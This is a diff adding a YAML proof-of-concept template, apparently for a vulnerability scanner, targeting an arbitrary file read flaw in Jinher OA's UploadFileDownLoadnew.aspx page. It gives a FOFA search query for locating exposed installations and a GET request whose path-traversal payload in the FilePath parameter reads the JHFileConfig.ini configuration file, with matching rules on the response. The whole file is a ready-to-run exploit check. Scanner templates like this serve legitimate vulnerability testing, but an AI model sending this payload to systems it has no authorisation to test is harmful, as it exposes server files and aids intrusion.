@@ -1,0 +1,22 @@
+id: poc-yaml-jin-he-oa-uploadfiledownloadnew-aspx-anyfile-read
+info:
+  name: 金和OA UploadFileDownLoadnew 任意文件读取漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini
+  expression: 'status_code == 200 &&
+
+    contains(body,"[JHFile]") &&
+
+    contains(body,"FolderTotal=") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
